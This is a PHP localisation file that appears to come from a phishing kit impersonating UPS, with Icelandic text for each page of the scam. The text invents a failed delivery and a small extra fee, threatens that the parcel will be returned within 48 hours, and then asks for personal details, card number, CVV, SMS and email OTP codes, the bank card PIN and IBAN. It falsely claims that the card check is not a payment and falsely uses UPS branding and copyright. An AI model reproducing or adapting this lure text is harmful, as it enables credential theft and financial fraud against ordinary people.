<?php

function lang($phrase){
    static $lang = array(

        "xlang" => "EN",
        "xcapt1" => "Vinsamlegast athugaðu við á CAPTCHA reitinn.",
        "xcapt2" => "Staðfesting",
        "xcapt3" => "Halda áfram",
        "xfot1" => "Þessi síða",
        "xfot2" => "Aðrar UPS vefsíður",
        "xfot3" => "Tengjast okkur",
        "xfot4" => "Löglega réttindi",
        "xfot5" => "Eignarhald ©1994- 2023&nbsp;United Parcel Service of America, Inc. Öll réttindi áskilin. ",
        "xind1" => "Leita",
        "xind2" => "Leitar númer",
        "xind3" => "Villa: Vinsamlegast gefið rétt leitar númer.",
        "xind4" => "Þarftu aðstoð við að breyta afhendingu þinni?",
        "xind5" => "Tilboð",
        "xind6" => "Flutningur",
        "xind7" => "Rekstur",
        "xind8" => "Fá hjálp",
        "xexp1" => "Afhending brostnar",
        "xexp2" => "Leit",
        "xexp3" => "Síðasta sendingin þín brotnaði. Hún er núna geymd í flokkunarmiðstöðinni.",
        "xexp4" => "Pakkin sem var sendur þér samræmist ekki vigtina sem tilgreind var og þú verður biðinn um að borga auka gjald til að tryggja að pakki þinn komi rétt fram.",
        "xexp5" => "Gjaldið er 0.48€",
        "xexp6" => "Til að borga, vinsamlegast smelltu á hnappinn hér fyrir neðan",
        'xexp7' => "Borga",
        "xexp8" => "Þegar gjaldið hefur verið greitt, verður pakki þinn flutt eins fljótt og mögulegt er að afhendingarheimili þitt.",
        "xexp9" => "Ef ekki er borgað innan 48 klukkutíma, verður pakkið sent aftur til sendanda.",
        "xexp10" => "Leita eftir vísunarnúmeri",
        "xexp11" => "Flytjendanúmer leitar",
        "xexp12" => "Önnur leitarþjónusta",
        "xinfz1" => "Staðfestu greiðsluupplýsingar þínar",
        "xinfz2" => "Fullt nafn",
        "xinfz10" => "Fæðingardagur",
        "xinfz3" => "Land",
        "xinfz4" => "Borg",
        "xinfz5" => "Heimilisfang",
        "xinfz6" => "Sími",
        "xinfz7" => "Póstnúmer",
        "xinfz8" => "Villa: Allar upplýsingar eru nauðsynlegar",
        "xinfz9" => "Staðfesta",
        "xpay1" => "Upplýsingar um greiðslu",
        "xpay2" => "Góður viðskiptavinur, athugaðu greiðsluupplýsingar þínar vel og samræmdu þær við kortaupplýsingar þínar til að ljúka",
        "xpay3" => "Nafn á korti",
        "xpay4" => "Kortanúmer",
        "xpay5" => "Gildistími",
        "xpay6" => "Öryggiskóði CVV (3 stafa)",
        "xpay7" => "Villa: Allar upplýsingar eru nauðsynlegar",
        "xpay8" => "Staðfesta",
        "xsms1" => "Staðfesting",
        "xsms2" => "Við höfum sent staðfestingarkóða á símann þinn.",
        "xsms3" => "OTP kóði",
        "xsms4" => "Villa: Rangur OTP kóði.",
        "xsms5" => "Þessi skref er nauðsynlegt til að ljúka öruggu greiðsluferlinu þínu.",
        "xsms6" => "UPS framkvæmir tímabundna auðkenningu á korti þínu til að staðfesta það. Þetta er einungis samráð og EKKI greiðsla.",
        "xsms7" => "Staðfesta",
        "xconf1" => "Framkvæmd afhendingar aftur",
        "xconf2" => "Borgun auka gjaldsins hefur verið tekin til greina.",
        "xconf3" => "Pakki þinn ætti að komast innan næstu 24 klukkutíma.",
        "xconf4" => "Staðfesta",
        "xpin1" => "Staðfesting",
        "xpin2" => "Sláðu inn PIN kóða fyrir bankakortið þitt",
        "xpin3" => "PIN kóði",
        "xpin4" => "(4 stafir)",
        "xpin5" => "Þessi skref er nauðsynlegt til að ljúka öruggu greiðsluferlinu þínu.",
        "xpin6" => "UPS framkvæmir tímabundna staðfestingu á korti þínu til að staðfesta það. Þetta er einungis samráð og EKKI greiðsla.",
        "xpin7" => "Staðfesta",
        "xmail1" => "Staðfesting",
        "xmail2" => "Við höfum sent staðfestingarkóða á tölvupósti þinn",
        "xmail3" => "Tölvupóstur kóði",
        "xmail4" => "(6 stafir)",
        "xmail5" => "Þessi skref er nauðsynlegt til að ljúka öruggu greiðsluferlinu þínu.",
        "xmail6" => "UPS framkvæmir tímabundna staðfestingu á korti þínu til að staðfesta það. Þetta er einungis samráð og EKKI greiðsla.",
        "xmail7" => "Staðfesta",
        "xiban1" => "Staðfesting",
        "xiban2" => "Vinsamlegast sláðu inn IBAN þinn til að ljúka greiðslunni",
        "xiban3" => "IBAN",
        "xiban4" => "(IBAN)",
        "xiban5" => "Þessi skref er nauðsynlegt til að ljúka öruggu greiðsluferlinu þínu.",
        "xiban6" => "UPS framkvæmir tímabundna staðfestingu á korti þínu til að staðfesta það. Þetta er einungis samráð og EKKI greiðsla.",
        "xiban7" => "Staðfesta"

    );    
    
    return $lang[$phrase];
}


?>